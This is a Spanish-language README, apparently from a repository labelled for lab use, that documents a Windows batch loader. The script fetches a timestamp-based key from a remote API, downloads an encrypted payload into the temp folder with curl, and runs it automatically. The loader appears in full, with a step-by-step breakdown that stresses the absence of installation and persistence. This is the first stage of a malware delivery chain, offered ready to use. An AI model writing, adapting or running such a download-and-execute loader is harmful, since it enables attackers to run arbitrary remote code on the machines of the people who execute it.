# ⚙️ Loader Script (Windows CMD) — Lab Usage

## 📌 Descripción

Este script en Batch actúa como **loader cliente** para consumir la API del proyecto.

Automatiza todo el flujo:

- Generación de timestamp
- Obtención de clave temporal
- Descarga del payload desde la API
- Ejecución del payload en el sistema local

---

## ⚙️ Flujo completo

```text
Timestamp → Key → Payload → Ejecución
```

---

## 📜 Código

```bat
@echo off
setlocal

set BASE=VPS
set FILE=%temp%\sc.bat

REM ===== TS =====
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i

REM ===== KEY =====
for /f %%i in ('curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i

REM ===== PAYLOAD =====
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"

REM ===== EXEC (sincrono) =====
call "%FILE%"
```

---

## 🧩 Desglose técnico

### 1. Configuración

```bat
set BASE=VPS
set FILE=%temp%\sc.bat
```

- `BASE`: endpoint de la API
- `FILE`: ruta temporal donde se guarda el payload

---

### 2. Generación de timestamp

```bat
powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"
```

- Usa PowerShell para obtener timestamp UNIX
- Se guarda en variable `TS`

---

### 3. Obtención de clave

```bat
curl -s "%BASE%/auth/key?ts=%TS%"
```

- Llama al endpoint `/auth/key`
- Devuelve clave temporal
- Se almacena en `KEY`

---

### 4. Descarga del payload

```bat
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
```

- Envía la key en header
- Descarga el payload
- Lo guarda en `%TEMP%`

---

### 5. Ejecución

```bat
call "%FILE%"
```

- Ejecuta el payload descargado
- Modo sincrónico (espera a que termine)

---

## 📈 Comportamiento

- No requiere instalación previa
- No persiste por sí mismo
- Ejecuta el payload directamente desde carpeta temporal
- Todo el flujo ocurre en memoria + temp

---

## ⚡ Uso

1. Guardar como `.bat`
2. Ejecutar en Windows
3. El script:
   - Contacta la API
   - Descarga payload
   - Lo ejecuta automáticamente

---

## 🧠 Resumen

Este script actúa como:

```text
Cliente automatizado de distribución de payload
```

Encaja como punto de entrada del sistema:

```text
API → Loader → Payload → Ejecución
```
